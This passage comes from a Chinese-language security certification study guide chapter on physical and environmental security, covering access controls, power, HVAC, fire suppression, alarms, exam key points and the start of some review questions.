现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展和骨干渠道。配线间一个更专业的技术名称是房屋线缆分布室。为了保证最大线缆传输限制，大型建筑物里需要多个配线间。配线间的安全是非常重要的。大部分的安全重点是在防止未授权的物理访问方面。如果一个未授权的入侵者获准访问该地区，他们可能偷取设备、拖拉或切断电缆，甚至安放窃听设备。因此，配线间的安全策略应包括如下可靠规则：</p><ul><li>不把配线间作为通用的存储区。</li><li>足够多的锁。</li><li>持区域的整洁。</li><li>不要存放易燃易爆物品。</li><li>设置视频来监控内部的配线间活动。</li><li>使用开门传感器来记录日志。</li><li>不要把钥匙给除了授权管理人员之外的任何人。</li><li>对配线间的安全和内容进行定期的物理检查。</li><li>把配线间纳入组织的环境管理和监控，以确保有适当的环境控制和监控，以及检测破坏性条件，如洪水或火灾。</li></ul><h4 id="10-2-3-服务器机房"><a href="#10-2-3-服务器机房" class="headerlink" title="10.2.3 服务器机房"></a>10.2.3 服务器机房</h4><p>　　服务器机房、数据中心、通信机房、配线间、服务器保管室和π 机房是被封闭的、受限的和受保护的房间，这里放置着关键的服务器和网络设备。集中化的服务器机房不需要与人相协调。服务器机房应设在建筑物的核心位置。尽量避免放置在底层、顶层和地下室。此外，服务器机房应远离水、气和污水管道，这些管道泄漏或泛滥的风险太大，可能会造成严重的损坏和故障停机时间。</p><h4 id="10-2-4-介质存储设施"><a href="#10-2-4-介质存储设施" class="headerlink" title="10.2.4 介质存储设施"></a>10.2.4 介质存储设施</h4><ul><li>把介质存放在上锁的柜子或保险箱中。</li><li>有库管理员或保管员来管理对带锁的介质柜的访问。</li><li>使用存入/取出流程来跟踪谁在检索、使用和返回存储介质。</li><li>对于重用介质，当被返还时，运行安全磁盘擦除或归零(通过无意义的数据(比如零)来取代擦除数据的过程)过程来删除所有残留数据。</li></ul><h4 id="10-2-5-证据存储"><a href="#10-2-5-证据存储" class="headerlink" title="10.2.5 证据存储"></a>10.2.5 证据存储</h4><ul><li>安全证据存储可能涉及以下：</li><li>一个专用的存储系统以区别于生产网络</li><li>当没有新的数据集传输到存储系统时就将存储系统离钱</li><li>阻断存储系统和互联网的连接</li><li>跟踪证据存储系统的所有活动</li><li>计算存储在系统中所有数据的哈希值</li><li>限制安全管理员和法律顾问的访问</li><li>对所有存储在系统上的数据进行加密</li></ul><h4 id="10-2-6-受限的和工作区域安全-例如，运营中心"><a href="#10-2-6-受限的和工作区域安全-例如，运营中心" class="headerlink" title="10.2.6 受限的和工作区域安全(例如，运营中心)"></a>10.2.6 受限的和工作区域安全(例如，运营中心)</h4><p>　　工作区和参观区域的设计和配置都应该仔细考虑。对设施内所有地方的进入要求不应该等同对待。进入含有更高价值或重要资产的区域应该受到限制。有价值的和保密的资产应该放置在设施的核心保护区或中心地区。实际上，应该专注于部署物理保护的同心圆。这种配置类型要求较高的授权级别才能进入组织的更敏感区域。设施安全设计过程应该支持内部安全的实施和维护。除了在适当的工作场所管理员工外，还应该解决访客和访客控制问题。</p><h4 id="10-2-7-数据中心安全"><a href="#10-2-7-数据中心安全" class="headerlink" title="10.2.7 数据中心安全"></a>10.2.7 数据中心安全</h4><h5 id="1-智能卡"><a href="#1-智能卡" class="headerlink" title="1. 智能卡"></a>1. 智能卡</h5><p>　　智能卡是信用卡大小的身份证、员工证或安全通行证，卡上具有磁条、条形码或植入的集成电路芯片。智能卡包含了经过授权的可以被用于身份识别和/或身份认证目的的持卡人信息。某些智能卡甚至具有处理信息的能力或被用于在内存芯片上存储一定数量的数据。下列短语或术语指的都是智能卡：</p><ul><li>包含集成电路(IC)的身份令牌</li><li>处理器IC卡</li><li>具有ISO 7816接口的IC卡</li></ul><p>　　大多数情况下，智能卡被用于多因子配置，因此，智能卡被盗或丢失不容易发生冒名替代的后果。最常见的用于智能卡的多因子认证要求使用PIN。</p><h5 id="2-接近式读卡机"><a href="#2-接近式读卡机" class="headerlink" title="2. 接近式读卡机"></a>2. 接近式读卡机</h5><p>　　接近式读卡机可以是无源设备、场源设备或发送应答器。接近式设备由经过授权的持卡人携带或持有，当持卡人通过接近式读卡机时，接近式读卡机能够确定持卡人的身份及其是否己被授权进行访问。无源设备不具有活动电子，只是具有特定属性的小磁场(如DVD 上常见的防盗设备)。场源设备是一种电子设备，当进入由读卡机产生的电磁场时会被激活。发送应答器是自有电源的设备，并且发射由读卡机接收的信号。除了智能卡、无记忆卡和接近式读卡机以外，还可以使用无线射频识别(RFID)或生物测定学方面的访问控制设备来管理物理访问。</p><h5 id="3-入侵检测系统"><a href="#3-入侵检测系统" class="headerlink" title="3. 入侵检测系统"></a>3. 入侵检测系统</h5><p>　　入侵检测系统是自动化的或人工的系统，这种系统被设计用于检测未经授权的个人企图发起的入侵、破坏或攻击行为，未授权入口点的使用情况，以及在未经授权的时间或非正常时间发生的犯法事件。物理的入侵检测系统也被称为防盗警报器，用于检测未经授权的活动并通知管理机构(内部的安全部门或外部的执法部门)。</p><h5 id="4-访问滥用"><a href="#4-访问滥用" class="headerlink" title="4. 访问滥用"></a>4. 访问滥用</h5><p>　　物理访问控制的滥用示例包括敞开安全门、绕过锁或访问控制。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某个人通过受到安全保护的门或通道，而自己并没有接受身份识别或身份认证。这样的检测滥用可以通过建立审计跟踪和保持访问日志来完成。</p><h5 id="5-放射防护"><a href="#5-放射防护" class="headerlink" title="5. 放射防护"></a>5. 放射防护</h5><p>　　用于阻止放射攻击的对策和防护类型被称为瞬时电磁脉冲设备屏蔽技术TEMPEST设备。TEMPEST的一些对策有法拉第笼、白噪声和控制区：</p><ul><li><strong>法拉第笼</strong> 通常是完全包围区域所有面的金属网。这个金属外壳具有能够产生电容效应(因此以法拉第命名)的弱电，从而可以防止所有电磁信号(放射信号)逸出或进入由法拉第笼围绕的区域。法拉第笼能够非常有效地阻拦EM信号。事实上，在有效的法拉第笼的内部，移动电话无法使用，并且无法接收广播或电视信号。</li><li><strong>白噪声</strong> 白噪声指的是一直广播虚假通信数据，从而掩盖和隐藏实际存在的放射信号。白噪声可以由另一个非机密来源的实际信号、特定频率的连续信号、随机的可变信号(例如，在广播电台或电视台之间听到的自噪声)甚至导致截获设备失效的干扰信号组成。在区域边界的周围生成白噪声是最为有效的，此时白噪声通过向外广播以保护需要放射信号才能完成正常运作的区域内部。</li><li><strong>控制区</strong> 控制区是第三种TEMPEST对策，它只是在受保护区域环境内实现法拉第笼或白噪声，在受保护区域环境外则不采取任何措施。控制区是所需设备使用和支持放射信号的区域(例如，无线互联、移动电话、无线电和电视信号)。在控制区外部，我们需要使用不同的TEMPEST对策来阻止对放射信号的拦截。</li></ul><h4 id="10-2-8-基础设施和HVAC注意事项"><a href="#10-2-8-基础设施和HVAC注意事项" class="headerlink" title="10.2.8 基础设施和HVAC注意事项"></a>10.2.8 基础设施和HVAC注意事项</h4><p>　　电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。不间断电源供应(Uninterruptible Power Supply，UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。另一种确保设备不会因为电源波动而造成损坏的方法是使用带有电涌保护器的配电盘。电涌保护器包含一根保险丝，它在电源功率剧烈变化而造成对设备的损坏之前熔断。但是一旦电涌保护器的保险丝熔断或电路因跳闸切断，电流就会被完全中断。如果希望维持很长时间的电力并且不会造成停电，那么需要一台现场发电机。大多数发电机运转时都使用液态或气态的燃料水槽，为了保证可靠性，必须维持充足的燃料。发电机被认为是电源的替换或后备方案。与电源相关的问题有很多。下面是应当熟悉的一组电源术语：</p><ul><li><strong>故障(fault)</strong> 电力瞬间消失</li><li><strong>中断(blackout)</strong> 电力完全消失</li><li><strong>电压不足(sag)</strong> 瞬间电压降低</li><li><strong>降压(brownout)</strong> 长时间低电压</li><li><strong>脉冲(spike)</strong> 瞬间高电压</li><li><strong>电涌(surge)</strong> 长时间高电压</li><li><strong>起动功率(inrush)</strong> 电源开始的电涌通常与连接的电源有关，无论电源是主电源还是替换/辅助电源</li><li><strong>噪声(noise)</strong> 持续不断的电源干扰</li><li><strong>瞬时现象(transient)</strong> 短时间的线路杂音干扰</li><li><strong>平稳(clean)</strong> 完全平稳的电流</li><li><strong>接地(ground)</strong> 电路中的电线是接地的</li></ul><h5 id="1-噪声"><a href="#1-噪声" class="headerlink" title="1. 噪声"></a>1. 噪声</h5><p>　　噪声造成的问题不仅会影响设备的功能，还可能会干扰通信、传输和播放的质量。电磁干扰(EMI)有两种类型： 普通模式和导线模式。普通模式的噪声是由电源或运转的电子设备的火线和地线之间的电势差产生的。导线模式的噪声是由电源或运转的电子设备的火线和中线之间的电势差产生的。与此类似的问题是射频干扰(RFI)，它与EMI一样，会影响许多系统。RFI由很多常见的电器产生。保护电力供应和保护设备不受到噪声干扰，这是为IT基础设施维护高效和功能稳定的环境的重要部分。这种保护措施所采取的步骤包括： 提供充足的电力条件，建立合适的接地措施，屏蔽所有电缆，以及限制暴露在EMI和RFI源中。</p><h5 id="2-温度、湿度和静电"><a href="#2-温度、湿度和静电" class="headerlink" title="2. 温度、湿度和静电"></a>2. 温度、湿度和静电</h5><p>　　除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。湿度太高会导致侵蚀，湿度太低则会产生静电。即使在不产生静电的地毯上，如果环境中的湿度太低，那么仍然可能产生两万伏特的静电放电。</p><h4 id="10-2-9-水的问题-例如，漏水和水灾"><a href="#10-2-9-水的问题-例如，漏水和水灾" class="headerlink" title="10.2.9 水的问题(例如，漏水和水灾)"></a>10.2.9 水的问题(例如，漏水和水灾)</h4><p>　　只要有可能，就要将放置服务器的房间和重要计算机设备远离任何水源或传输管道。还可能希望在关键任务系统的地板周围安装水检测电路。水检测电路具有警报装置，如果水正在侵入设备，那么就会发出警报。</p><h4 id="10-2-10-火灾的预防、检测和抑制"><a href="#10-2-10-火灾的预防、检测和抑制" class="headerlink" title="10.2.10 火灾的预防、检测和抑制"></a>10.2.10 火灾的预防、检测和抑制</h4><p>　　不同的抑制介质针对火的不同方面：</p><ul><li>水能够抑制高温</li><li>苏打酸和其他干粉能够抑制燃料供应</li><li>二氧化碳能够抑制氧气供应</li><li>哈龙替代物与其他非易燃气体能够干扰化学燃烧和/或抑制氧气供应</li></ul><h5 id="1-灭火器"><a href="#1-灭火器" class="headerlink" title="1. 灭火器"></a>1. 灭火器</h5><table><thead><tr><th>级别</th><th>火灾类型</th><th>灭火材料</th></tr></thead><tbody><tr><td>A</td><td>普通的易燃品</td><td>水、苏打酸(干粉或液态化学物质)</td></tr><tr><td>B</td><td>液体</td><td>二氧化碳、哈龙*、苏打酸</td></tr><tr><td>C</td><td>电子</td><td>二氧化碳、哈龙*</td></tr><tr><td>D</td><td>金属</td><td>干粉</td></tr></tbody></table><ul><li>哈龙或EPA 批准的哈龙替代物</li></ul><h5 id="2-防火检测系统"><a href="#2-防火检测系统" class="headerlink" title="2. 防火检测系统"></a>2. 防火检测系统</h5><p>　　当达到某一特定温度时，设定好温度的检测系统就会触发灭火抑制装置。触发器通常是带洒水头的金属或塑料元件，在某一特定的温度下会融化。温度上升比率检测系统在温度的改变速度达到某一特定级别时就会触发灭火抑制装置。火焰激发系统是根据火焰的红外线能量来触发灭火抑制装置。烟感系统则根据光电或放射性电离传感器来触发灭火抑制装置。大多数防火检测系统可以与火灾响应服务通知机制链接在一起。在灭火抑制装置被触发时，这些链接在一起的系统会通过发出自动的消息或警报来通知本地的火灾响应团队以及请求援助。</p><h5 id="3-放水灭火系统"><a href="#3-放水灭火系统" class="headerlink" title="3. 放水灭火系统"></a>3. 放水灭火系统</h5><ul><li>湿管道系统(也称为封闭头系统)总是充满了水。当灭火装置被触发时，就会立刻放水。</li><li>干管道系统中包含被压缩的空气。一旦灭火装置被触发，空气泄漏，打开水间，从而使管道充满水井放出水来。</li><li>洪水系统是干管道系统的另一种形式，它使用较粗的管道，因此能排出大股的水流。洪水系统对于放置了电子设备和计算机的环境不太适合。</li><li>预先响应系统是干管道/湿管道系统的组合系统。这种系统一直作为干管道系统存在，直至检测到有火灾(烟、热及其他)发生，然后向管道中充满水。由于充分受热，洒水头触发器被融化之后释放出水。如果在洒水头被触发之前火被熄灭，那么管道可以被手工排空并重新设置。这种系统还允许在洒水头触发之前进行人工干预，以便停止放水。</li></ul><h5 id="4-气体释放系统"><a href="#4-气体释放系统" class="headerlink" title="4. 气体释放系统"></a>4. 气体释放系统</h5><p>　　气体释放系统通常比放水系统更有效。然而，气体释放系统不应当被部署在有人的环境中。气体释放系统通常从空气中抽走氧气，因此对人是非常危险的。</p><h5 id="5-损失"><a href="#5-损失" class="headerlink" title="5. 损失"></a>5. 损失</h5><p>　　火灾引起的破坏性要素包括烟和热，还包括灭火抑制介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须考虑上述所有问题。</p><h3 id="10-3-实施和管理物理安全"><a href="#10-3-实施和管理物理安全" class="headerlink" title="10.3 实施和管理物理安全"></a>10.3 实施和管理物理安全</h3><h4 id="10-3-1-周边-例如，访问控制和监控"><a href="#10-3-1-周边-例如，访问控制和监控" class="headerlink" title="10.3.1 周边(例如，访问控制和监控)"></a>10.3.1 周边(例如，访问控制和监控)</h4><p>　　建筑物或校园位置的入口也很重要。单入口可极大地提供安全性，但多个入口在紧急情况下可提供更好的疏散性。</p><h5 id="1-栅栏、大门、旋转门和陷阱"><a href="#1-栅栏、大门、旋转门和陷阱" class="headerlink" title="1. 栅栏、大门、旋转门和陷阱"></a>1. 栅栏、大门、旋转门和陷阱</h5><p>　　栅栏是外围设备。栅栏被用于在受到特殊安全保护级别的区域和其他区域之间进行明确的隔离。用栅栏筑围墙可以包括广泛的成分、材料和建造方法，可能包括地上的画线、铁丝网、带刺铁丝网、水泥墙和使用激光、运动探测仪或热源探测仪的不可见防线。大门是栅栏上受到控制的出入点。为了维持栅栏整体的有效性，大门的阻挡程度必须与栅栏的阻挡程度相同。绞链和锁闭/闭合机制应该进行加固，以防止损坏、破坏或拆卸。当大门关闭时，不应该提供任何额外的出入脆弱性。门的数量应当尽可能最少。旋转门每次只可以进一个人，并且常常限制为单方向转动。要么只允许进门，要么只允许出门。旋转门基本上可以等同于安全的旋转门。陷阱是通常由保安人员守护的双重门设置。陷阱的目的是牵制主体，直至其身份得到确认和验正。如果经过证明他们可以被授权进入，那么内部的门打开，从而准许这些人员进入设施或周围的附属地区。如果他们没有得到授权，那么两扇门都保持关闭并锁住，直至警卫(通常是保安人员或警察)到来将这些闯入者护送离开设施或因非法入侵逮捕他们(这也被称为迟滞特性) 。通常，陷阱包括阻止跟随捎带和尾随的措施。</p><h5 id="2-照明"><a href="#2-照明" class="headerlink" title="2. 照明"></a>2. 照明</h5><p>　　照明是最常用的一种边界安全控制形式。照明的主要目的是阻拦那些偶然的入侵者、闯入者、小偷和希望在黑暗中实施恶意行为的潜在窃贼。照明应当不照亮保安人员、看门狗、巡逻岗哨或其他类似的安全保卫者。此外，在攻击者非法闯入期间，照明也不能因为强光或反射使保安人员、看门狗和监控设备受到干扰，否则更利于攻击者。</p><h5 id="3-保安和看门狗"><a href="#3-保安和看门狗" class="headerlink" title="3. 保安和看门狗"></a>3. 保安和看门狗</h5><p>　　所有的物理安全控制，无论是静止的阻碍物还是主动的检测和监视机制，最终都要依靠人的介入来阻止实际的入侵和攻击。保安可能沿边界进行部署，或者被部署在边界内。他们监视着进出口，或者监控着进行检测和监视的显示器。保安的真正优势在于他们能够适应任何环境或情况并做出反应。保安能够记住并识别攻击和入侵的行为和方式，可以适应正在改变的环境，并且能够作出判断和决定。在需要立即的、现场的事态控制和决策制定时，保安常常是恰当的安全控制选择。不是所有的环境和设施都支持部署保安。这可能是由于实际环境中存在不适合人的因素，或是设施的规划、设计、位置和建筑的原因。不是所有的保安都是可信赖的。预先筛选、联系和培训无法保证不会出现低效的和不可靠的保安。看门狗可以替代保安，它们常常作为边界的安全控制措施进行部署。作为侦测和威慑的一种形式，看门狗是非常有效的。然而，喂养狗的费用很高，并且需要高标准的养护，同时还会带来极高的保险和责任要求。</p><h4 id="10-3-2-内部安全-例如，陪同要求-访问者控制、钥匙和锁"><a href="#10-3-2-内部安全-例如，陪同要求-访问者控制、钥匙和锁" class="headerlink" title="10.3.2 内部安全(例如，陪同要求/访问者控制、钥匙和锁)"></a>10.3.2 内部安全(例如，陪同要求/访问者控制、钥匙和锁)</h4><h5 id="1-钥匙和密码锁"><a href="#1-钥匙和密码锁" class="headerlink" title="1. 钥匙和密码锁"></a>1. 钥匙和密码锁</h5><p>　　锁使得被关闭的门保持闭合。它们被用于阻止缺乏正确授权的人。锁是身份标识和身份认证机制的强硬形式。只有具有正确的钥匙或密码，才会被授权准许进入。使用钥匙的锁是最常见的和最廉价的物理访问控制设备形式，常常被称作预置锁。可编程的锁或密码锁能够提供比预置锁更广泛的控制。电子访问控制(EAC)锁由下列三种元素组成： 保持门关闭的电磁体、验证主体和使电磁体失效的凭证读卡机，以及重新使用电磁体的闭门感应器。</p><h5 id="2-员工证"><a href="#2-员工证" class="headerlink" title="2. 员工证"></a>2. 员工证</h5><p>　　员工证、身份证或安全ID都是物理身份标识和/或电子访问控制设备的形式。员工证可能被用在物理访问主要受到保安控制的环境中。员工证还可以在由扫描设备守卫而非保安守卫的环境中使用。</p><h5 id="3-运动探测仪"><a href="#3-运动探测仪" class="headerlink" title="3. 运动探测仪"></a>3. 运动探测仪</h5><p>　　运动探测仪或运动传感器是在特殊区域内使用的、用于感知物体运动的设备。运动探测仪的常见类型如下：</p><ul><li><strong>红外运动探测仪</strong> 对被监控区域红外照明模式的显著变化进行监视。</li><li><strong>热能型运动探测仪</strong> 对被监控区域内的热能等级和模式的显著变化进行监视。</li><li><strong>波形运动探测仪</strong> 向被监控的区域发射连续的弱超声波或高频微波，并且对反射波的显著扰动或变化进行监视。</li><li><strong>电容运动探测仪</strong> 对被监控物体周围区域的电场或磁场变化进行探测。</li><li><strong>光电运动探测仪</strong> 通常在没有窗户或保持昏暗的房间内部使用。</li><li><strong>无源音频运动探测仪</strong> 对被监控区域内的非正常声音进行侦听。</li></ul><h5 id="4-入侵警报"><a href="#4-入侵警报" class="headerlink" title="4. 入侵警报"></a>4. 入侵警报</h5><p>　　警报是一种分离机制，可以引发威慑、防护和/或通知。</p><ul><li><strong>威慑报警</strong> 引发威慑警报可能会采用额外的加锁、关门等措施。这种警报的目的是使得进一步的入侵或攻击变得更难。</li><li><strong>排斥报警</strong> 引发排斥警报声通常听起来像汽笛或钟声，并且会将灯打开。这些警报类型被用于令入侵者或攻击者气馁，从而不再继续他们的恶意或入侵行为，并且离开这个设施。</li><li><strong>通知报警</strong> 引发通知警报对于入侵者汇攻击者来说常常是缄默的，但是它们会记录事故的相关数据，并且通知管理员、保安和执法机构。事故的记录可以采取日志文件和/或闭路电视磁带的形式。缄默警报的目的是将授权的安全人员带到入侵或攻击的位置，以便期望抓住进行有害活动的人。</li></ul><p>　　报警也通过它们所在的地方(本地、集中、专有或辅助)被归类。</p><ul><li><strong>本地报警</strong> 本地警报系统必须广播司听到的警报信号(最大可到120分贝)，这个信号最远可以传播400英尺。此外，本地警报系统必须受到保护，通常应由保安进行保护，以防止损害和损坏。为了使警报系统有效，附近必须有安全团队或保安，他们可以在警报被触发后立即进行响应。</li><li><strong>集中式警报系统</strong> 可能在本地没有警报，在警报触发时会通过信号通知远程或集中式监控站。大多数中央集中式系统都是很知名的公司或是国家安全公司。专有系统类似于中央系统，但托管组织有他们自己的现场保安人员等待并响应安全破坏。</li><li><strong>辅助警报系统</strong> 辅助警报系统可以加入本地或集中式警报系统。当安全边界被破坏时，紧急服务机构将被通知和对事件做出响应，并抵达相应地点。这些紧急服务机构可能包括消防、警察和医疗服务。</li></ul><h5 id="5-二次验证机制"><a href="#5-二次验证机制" class="headerlink" title="5. 二次验证机制"></a>5. 二次验证机制</h5><p>　　当运动检测器、传感器和报警器被使用时，二次验证机制应该在适当的位置。随着这些设备的灵敏度增高，错误触发会经常发生。使用两个或两个以上的检测和传感器系统，并要求警报发出之前的短时内有两个或两个以上的快速成功触发。这可以显著减少错误警报，并提高报警显示实际入侵或攻击的可能性。CCTV是一种安全机制，涉及运动探测器、传感器和报警器。然而，CCTV并不是自动化的检测和响应系统。CCTV需要人员观看捕获的批频来检测可疑和恶意的活动，并触发报警。安全摄像头可以扩大保安人员的有效可见范围，因此增大了监控的范围。用来作为一个二次或后续机制，当自动化系统触发后进行审查。事实上，审计和审计跟踪的使用逻辑同样用于CCTV 和事件记录。CCTV 是预防措施，而审查事件记录是检测措施。</p><h5 id="6-环境和生命安全"><a href="#6-环境和生命安全" class="headerlink" title="6. 环境和生命安全"></a>6. 环境和生命安全</h5><p>　　不论在任何情况和任何条件下，保护人员生命是安全的最重要方面。因此，对于所有安全解决方案来说，防止人员遭受生命伤害是最重要的目标。对人员生命安全进行维护的部分内容是维护设施的基本环境。物理安全措施应注重保障人员生命，然后才是恢复环境的安全性和恢复IT基础设施的必要功能。<br>　　许多组织采取人员紧急计划(0∞upant Emergency Plan，OEP)指导和协助在灾难发生时维持人员生命安全。OEP提供了如何减少对生命的威胁、防止损伤、管理压力、处理迁移以及提供安全监控保护财产的指导，并保护资产避免在物理事件中遭受损害。OEP不解决IT问题或业务连续性问题，而只解决人员和一般财产问题。BCP和DRP才解决IT、业务连续性和恢复问题。</p><h5 id="7-隐私责任和法律需求"><a href="#7-隐私责任和法律需求" class="headerlink" title="7. 隐私责任和法律需求"></a>7. 隐私责任和法律需求</h5><p>　　隐私意味着保护个人信息不被泄露给未经任何授权的个人或实体。处理隐私是任何有员工的组织的一个要求。因此，隐私是所有组织的一个核心问题。对于任何组织，隐私保护应该在安全策略中是一个核心任务或目标设定。</p><h5 id="8-合规要求"><a href="#8-合规要求" class="headerlink" title="8. 合规要求"></a>8. 合规要求</h5><p>　　每个组织都运营在一定的行业和管辖权内。这两个实体(可能还有附属的实体)把法律要求、限制和规定强加到它们领域内的组织实践中。这些法律要求可以应用于软件许可、雇佣限制、处理敏感资料，并符合安全规定。遵守所有适用的法律规定是维护安全的一个关键部分。法律法规要求对于行业或国家(也经常是州和城市)都一定在基础安全建设方面被视为底线和基础。</p><h3 id="10-4-考试要点"><a href="#10-4-考试要点" class="headerlink" title="10.4 考试要点"></a>10.4 考试要点</h3><ul><li><strong>理解为什么缺乏物理安全就没有安全性</strong> 缺乏对物理环境的控制，那么行政性的或技术性的/逻辑性的访问控制就无法提供足够的安全性。如果’怀有恶意的人可以获得对设施或设备的物理访问权限，那么他们就会进行他们想要做的任何事情，包括从破坏到泄密乃至更改的任何事情。</li><li><strong>能够列举行政性的物理安全控制</strong> 行政性的物理安全控制包括场地的构造和选择、场地管理、人员控制、意识培训和紧急事件响应及规程。</li><li><strong>能够列举技术性的物理安全控制</strong> 技术性的物理安全控制包括访问控制、入侵检测、警报、CCTV、监视、HVAC、电源以及火灾检查和排除。</li><li><strong>能够指出物理安全的物理控制</strong> 物理安全的物理控制包括栅栏、照明、锁、建筑材料、陷阱、看门狗和警卫。</li><li><strong>理解控制的作用顺序</strong> 控制的作用顺序依次是： 阻拦、拒绝、检测和延缓。</li><li><strong>理解选择场地和设计建筑设施的主要内容</strong> 确定场地方面的主要内容包括可视性、周围地形、地区的可到达性以及自然灾害的影响。设计建筑设施方面的主要内容是要理解组织需要的安全等级，在建筑设计开始之前制定计划。</li><li><strong>理解如何设计和配置安全工作区域</strong> 对设施内所有地方的进入要求不应该等同对待。包含更高价值或重要资产的地区的进出应该受到限制。有价值的和机密的资产应该放在设施提供的保护核心或中心地区。同样，集中放置的服务器或计算机机房不需要人员协调。</li><li><strong>理解配线间的安全问题</strong> 现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展、骨干渠道。配线间大部分的安全集中在防止未授权的物理访问。如果未授权入侵者进入该区域，他们可能会偷盗设备、拖拉或切断电缆甚至安放窃听设备。</li><li><strong>理解在安全设施内如何管理来访者</strong> 如果设备通过受限制的区域控制物理安全，那么就需要具备管理来访者的方法。来访者经常会被指派一名陪同，并且他们的访问和行动都要受到严密监视。当外来人员被授权进入受保护的区域时，未能对他们的行动进行跟踪可能会导致针对保护程度最高的资产的恶意行为。</li><li><strong>理解为管理物理安全而进行的安全控制的三种策略，并且能够举出它们的例子</strong> 用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。理解何时以及如何使用这些类型，并且能够列出每种类型的例子。</li><li><strong>理解介质存储的安全需求</strong> 介质存储设施应该被设计用于安全地保存空白介质、可重用介质和安装介质。关注的问题包括盗窃、数据损坏和数据的残余恢复。对介质存储设备的保护包括带锁的柜子或保险箱、使用库管理员或保管员、实施存入/取出过程以及利用介质消磁。</li><li><strong>理解证据存储的问题</strong> 证据存储用来保留用于恢复、内部调查和电子取证调查的日志、驱动图像、虚拟机快照和其他数据。保护措施包括专用/隔离存储设施、离线存储、活动跟踪、哈希管理、访问限制和加密。</li><li><strong>理解物理访问控制的常见威胁</strong> 无论使用哪一种形式的物理访问控制，为了阻止滥用、伪装和尾随，必须同时配备保安人员或其他监控系统。物理访问控制的滥用是指打开安全门或者绕过锁或访问控制措施。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某人通过受到安全保护的门或通道，而本身没有接受身份识别或获得授权。</li><li><strong>理解对审计跟踪和访问日志的需要</strong> 对于物理访问控制来说，审计跟踪和访问日志也是非常有用的工具。它们可能需要保安人员手工建立，或者在有足够的自动化访问控制机制(例如，智能卡和某些接近式读卡机)的情况下自动生成。还可以考虑使用CCTV(闭路电视)进行入口点的监控。CCTV(闭路电视)能够将审计跟踪和访问日志与可视化的事件历史记录进行比较。这些信息对于重新构建入侵、破坏或攻击事件非常关键。</li><li><strong>理解对平稳电源的需要</strong> 电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。许多组织机构通过几种方法来选择管理他们自己的电源。不间断电源供应(UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。UPS在主要电源出现故障或无法获得的情况下，还能够提供持续的电力供应。UPS可以提供数十分钟或数小时的电力，这取决于它的容量和设备所需的用电量。</li><li><strong>理解常用的电力术语</strong> 知道下列术语的定义： 故障、中断、电压不足、降压、脉冲、电涌、起动功率、噪声、瞬时现象、平稳和接地。</li><li><strong>理解如何控制环境</strong> 除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。主要放置计算机的房间应该保持温度在华氏60到75度之间(即摄氏15到23度)。计算机房间的湿度应该维持在40%和60%之间。湿度太高会导致侵蚀，湿度太低会导致产生静电。</li><li><strong>知道什么是静电</strong> 即使在不产生静电的地毯上，如果环境中的湿度太低，那么也仍然可能产生两万伏特的静电放电。即使很少的静电放电也可能毁坏电子设备。</li><li><strong>理解管理漏水和水灾的需求</strong> 环境安全策略和措施中应当解决漏水和水灾问题。管道漏水不会每天都发生，但当真的发生时，经常会造或重大的损失。水和电是不能相容的。如果计算机系统与水接触了(特别是在系统运行时)，那么就会发生损坏事故。只要有可能，就要让放置服务器的房间和重要计算机设备远离任何水源或传输管道。</li><li><strong>理解防火检测和灭火措施的重要性</strong> 防火检测和灭火措施绝不能被忽略。保护人员不受到伤害应该始终是所有安全或保护系统中最重要的目标。除了保护人员不受到伤害以外，设计防火检测和灭火措施的目的是将由火、烟、热和灭火材料引起的损失最小化，特别是与IT基础设施相关的部分。</li><li><strong>理解由于火灾和灭火材料可能导致的环境污染和损失</strong> 火灾引起的破坏性要素包括烟和热，也包括灭火介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须解决所有这些问题。</li><li><strong>理解人员的隐私和安全</strong> 在所有的情况下，安全最重要的作用方面是保护人。因此，防止对人的伤害是所有安全解决方案中最重要的目标。</li></ul><h3 id="10-5-复习题"><a href="#10-5-复习题" class="headerlink" title="10.5 复习题"></a>10.5 复习题</h3><ol><li><p>以下哪一项是安全中最重要的方面?<br>A. 物理安全<br>B. 入侵检测<br>C. 逻辑安全<br>D. 意识培训</p></li><li><p>对于新的设施，有什么方法可以用来制定出组织的需要?<br>A. 日志文件审计<br>B. 关键路径分析<br>C. 风险分析<br>D. 存货清单</p></li><li><p>通常什么基础设施组件位于多个楼层的相同位置，用于把每个楼层网络连接在一起以提供便利?<br>A. 服务器机房<br>B. 配线间<br>C. 数据中心<br>D. 介质柜</p></li><li><p>以下哪一项不是设施或场地的安全关注的设计元素?<br>A. 工作区和访客区的隔离<br>B. 限制对高价值或重要区域的访问<br>C. 位于设施核心或中央位置的机密区域<br>D. 对设施内所有位置的相同访问</p></li><li><p>为了维持最有效和安全的服务器机房，以下哪一项不必是真的?<br>A. 必须和人共存<br>B. 必须包括非水灭火装置的使用<br>C. 湿度必须保持在40%到60%之间<br>D. 温度必须保持在华氏60到75度</p></li><li><p>下列哪个典型的安全措施的执行不涉及包含可重用移动介质的存储设施?<br>A. 雇佣库管理员或保管员<br>B. 使用存入/取出过程<br>C. 哈希<br>D. 在返回的介质上使用净化工具</p></li><li><p>以下哪一项是一套双门，往往由保安人员保护，并且用于容纳主体，并直到他们的身份和授权信息被验证?<br>A. 大门<br>B. 旋转门<br>C. 陷阱<br>D. 接近式传感器</p></li><li><p>周边安全设备或机制的最常见形式是什么?<br>A. 保安人员<br>B. 栅栏<br>C. 